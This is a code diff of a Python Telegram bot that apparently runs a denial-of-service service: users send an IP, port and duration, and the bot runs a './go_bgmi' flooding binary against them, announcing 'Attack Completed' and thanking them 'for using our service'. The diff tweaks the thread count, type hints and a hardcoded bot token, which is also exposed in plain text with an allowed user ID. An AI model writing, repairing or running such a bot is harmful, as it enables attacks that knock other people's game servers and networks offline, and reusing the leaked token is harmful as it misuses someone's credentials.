@@ -4,14 +4,14 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from telegram.error import TelegramError
 
-TELEGRAM_BOT_TOKEN = '8104815748:AAFLJpVbuIqjzpi8K6gl5-DO62N9MnJcPs'
+TELEGRAM_BOT_TOKEN = '8104815748:AAFLJpVqbuIqjzpi8K6gl5-DO62N9MnJcPs'
 ALLOWED_USER_ID = 6110735258
 bot_access_free = True  
 
 # Store attacked IPs to prevent duplicate attacks
 attacked_ips = set()
 
-async def start(update: Update, context: CallbackContext.DEFAULT_TYPE):
+async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*🔥 Welcome to the battlefield! designed by @theujjwalsingh18🔥*\n\n"
@@ -20,10 +20,10 @@ async def start(update: Update, context: CallbackContext.DEFAULT_TYPE):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context: CallbackContext.DEFAULT_TYPE):
+async def run_attack(chat_id, ip, port, duration, context: CallbackContext):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./go_bgmi {ip} {port} {duration} 24",
+            f"./go_bgmi {ip} {port} {duration} 4",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -40,7 +40,7 @@ async def run_attack(chat_id, ip, port, duration, context: CallbackContext.DEFAU
     finally:
         await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext.DEFAULT_TYPE):
+async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id  
 
